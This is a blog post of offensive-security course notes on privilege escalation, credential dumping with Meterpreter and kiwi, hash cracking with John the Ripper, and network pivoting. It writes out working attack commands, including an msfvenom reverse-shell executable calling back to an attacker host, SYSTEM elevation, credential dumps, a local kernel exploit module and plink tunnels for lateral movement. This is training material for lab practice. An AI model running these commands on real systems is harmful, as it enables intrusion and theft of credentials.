---
layout: post
title: "CNO Day 3 PrivEsc"
date: "2018-07-25 08:54:01"
comments: false
categories: "cybersec"
---

Privilege Escalation.

# Basics

On Windows, `SYSTEM` is the highest privilege possible. Local Administrators can effectively get SYSTEM privileges.

On Linux, `root` (uid=0) is the highest privilege possible. Regular users can escalate to root privileges on demand (i.e. sudo).


# Techniques

* Kernel exploits - leverage a flaw in the OS. Vunerabilty is determined by researching kernel version, patch levels. Tend to be patched quickly.
* High privileged programs - get a program running at a higher privilege to execute your code. Often things are unnessarily run with high privileges for convenience sake. For example, JBoss running on TomCat, running as root. Deploy a WAR to JBoss with an embedded reverse shell.
* Credential theft - leverage techniques to compromise a user with higher privileges. The primary method of lateral movement within organisations. Dumping of hashes, such as responder, SCF files on writab shares, UNC requests (when a user attempts to `\\server` an auth request is sent and can be captured), network sniffing. Password reuse. [SCF to steal credentials](https://www.bleepingcomputer.com/news/security/you-can-steal-windows-login-credentials-via-google-chrome-and-scf-files/).
* Insecure configurations - abuse incorrectly services or programs. Service paths with whitespace is a great example e.g. *C:\anti-virus\virus definition\bin\update.exe*, Windows path probing will attempt to find and run *C:\anti-virus\virus.exe*.


On Linux in the `/etc/shadow` file, the prefix e.g. `$6` indicates the hash function and salt, for example, this entry:

    bob:$6$8XDGak85XFIUrEbc$S.kuUwl5FFqSKykM0KwSUTVhbNGuq0DJmd2vWE6PC7y3U.5Npr4iC9qlO.6SvMxlRUSfU7pZ01LHtV1xyroYq.::0:99999:7:::
        ^ ^
        | salt
        hash
For more checkout [Understanding and generating the hash stored in /etc/shadow](https://www.aychedee.com/2012/03/14/etc_shadow-password-hash-formats/)

Passwords are salted and hashed, so that even if users have the same password, a different hash is stored. A user is randomly assigned a salt (e.g. a sequence of bytes). The salt is generally prepended or appended to password

TODO: Rainbow tables.

Some popular hash brute forcing utilities; `hashcat` `johntheripper`. Checkout the `hashcat` attack modes for example; which can do straight, combination, brute force, hybrid wordlist with mask.


Hash primer:

* One way
* Collision resilient

LLMNR Local Link Multi Node Resolver. In a nutshell, a user types sharepoint.local. First a DNS request to answer whats the IP, and sends you to that location. If an incorrect URI is typed (fat fingers), the fallback protocols of LLMNR (Responder) kick it, which freely transmit the users hash.

setuid is another escalation avenue:

    cp /usr/bin/id ~/fooid
    chown king-phisher: ~/fooid
    chmod +s ~/fooid
    ./fooid

Take note of the euid in the output, the effective user.



# Attacking Hashes

* Gather wordlists - https://github.com/danielmiessler/SecLists/tree/master/Passwords
* Gather password hashes - [Mimikatz]() [Meterpreter]()
* Crack password hashes - [Hashcat]() [John the Ripper]() [Hydra]()
* Pass the hash - do you even need to crack?



# Exercise Hashing

* Hook up a bind or reverse shell to the desired target machine. Ensure payloads line up on both ends (unstaged/staged, meterpreter), and for the target platform (e.g. windows).

Tip: if using the PHP meterpreter shell, you will need to scale up to the native windows/linux shell whcih is more comprehesive. MSFVenom to spit out a native windows reverse shell. 

    meterpreter> lpwd
    meterpreter> lcd /root
    meterpreter> upload shell.exe   #puts a file on the host
    meterpreter> background   # this is how to background an active session
    msf exploit(handler)> sessions   # lists active sessions
    msf exploit(handler)> execute -f shell.exe
    meterpreter> sessions 1
    meterpreter> sysinfo
    meterpreter> ps
    meterpreter> migrate 2616    # to migrate rshell into pid 2616
    meterpreter> hashdump
    meterpreter> getsystem   # elevate to SYSTEM, needed for kiwi extensions
    meterpreter> load kiwi    # load the kiwi extension
    meterpreter> creds_all    # will dump out hashes, and in memory passwords
    meterpreter> help    # will now show kiwi help



Metasploit Console job management tips:

* To list active jobs, use the `jobs` command
* To kill all jobs `jobs -k`
* To list sessions `sessions`
* To connect to a specific session `sessions 1`

Once you obtain the hashes, you can do some offline analysis. For example, `john` (John the Ripper) is a popular password cracking tool. It can take in a simple colon `user:hash` delimited list. Tip: the Vim visual block editing mode (^v) is brilliant for this. Note that `creds_all` provides 3 types of hashes, LM, NTLM and SHA1. Choose which has you want to target (e.g. LM):

    john --test    # test john is working
    john target-hashes.txt    # feed john a user:hash list

For a decent wordlist, checkout `/usr/share/wordlists/rockyou.txt` (a 300MB chunk of common password, pulled out of a case study from the infamous rockyou forum cyber incident). Feed them into John:

    john --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes.txt

John will occassionally recognise hashes as the wrong type (e.g. raw MD5, LM DES, etc). John supports lots of [formats](http://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats), and formats can (should) be specified explicitly with the `--format` switch. To work on SHA1 hashes for example:

    john --wordlist=/usr/share/wordlists/rockyou.txt --format=lm --rules hashes-lm.txt

To show results:

    john --show hashes-lm.txt
    Administrator:VOLCANO
    FOOBAR$:


# Random Tips

OJ Reevs - maintains meterpreter - lives in QLD.
Steven Vewer - executable reflection - technique how the migrate functionality works.



# End to End SMB ExternalBlue Vunerability Walk Through

Spin up a handler:

    msfconsole
    msf > use exploit/multi/handler
    msf > set payload windows/shell/reverse_tcp
    msf > set LHOST 192.168.0.99   # the kali host

You can slowly elevate priviliges.

    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.99 LPORT=4444 -f exe -o malicious.exe

Get this onto your Windows target somehow, and running. It will call back onto the listener:

    msf exploit > set exploit/windows/local/ms13_053_schlamperei
    msf exploit(ms13_053_schlamperei) > options
    msf exploit(ms13_053_schlamperei) > set SESSION 1   # this is the previously established low priv meterpreter session id
    msf exploit(ms13_053_schlamperei) > set payload windows/x64/meterpreter_reverse_tcp
    msf exploit(ms13_053_schlamperei) > SET LHOST 192.168.0.99   # kali box
    msf exploit(ms13_053_schlamperei) > run

Tip: When looking for local windows exploits, those prefixed with MS are often very reliable, due to them being kernel related vunerabilties.

Tip 2: `searchsploit` is awesome


# Pivoting

Useful for using a middle box, which can then in turn be used to leap frog to other parts of the network.

    [Attacker]  -->   [User Destop]    -->    [   DC   ]



## Metasploit

### portfwd

On an active meterpreter session, you have the awesome `portfwd` command. Hit help for more `portfwd help`.

### route

In meterpreter, you can setup an internal route table, via a specific meterpreter session, e.g:

    route 192.168.1.1 255.255.255.0 1


# SSH Tunnels

* Remote, Local and Dynamic port forwarding enables lateral movement. The decision between remote and local, comes down to where you need the port.
  * Remote - listen on the server - traffic from initiator perspective
  * Local - listen on the initiator - traffic from server perspective
* `plink` is a great binary for doing SSH'ing client on windows

A rmeote port forwarding example. To use `plink` and setup a tunnel on the middle (user desktop) box, you could run the following:

    ssh <ssh server> -R [SSH server IP to Bind To]:[SSH Server Port to Bind To]:[Target Destination]:[Target Port]

    plink.exe attacker@red -R 127.0.0.1:4444:blue:3389


A local port forwarding example;

    ssh <ssh server> -L [IP Address of Initiating Machine]:[Bind Port of Initiating Machine]:[IP Address of Target Machine]:[Target Machine Port]

    plink.exe attacker@red -L black:4444:127.0.0.1:5555


# Proxytunnels

TODO


# Linux Tips for Escalation

SUID binaries are a great low hanging fruit.

An example of a SUID binary that ran `id` without a fully qualified path. Take advantage of this, by modifying the PATH to include, say your HOME dir, create a small bash script called `id`, give it execute. Now it will run with root privs.

The find command interesting runs as a suid binary, with root privs. Can take advantage of the `-exec` switch which will run arbitary commands.

Kernel exploits are another.

Linux exploit 43418



TODO: `find` switches to search for files with suid permission bit.

TODO: Setup SSH tunnel, for proxying between.

TODO: Play with SUID elevated privs. Compile exploit with GCC, make sure spits an ELF binary out.

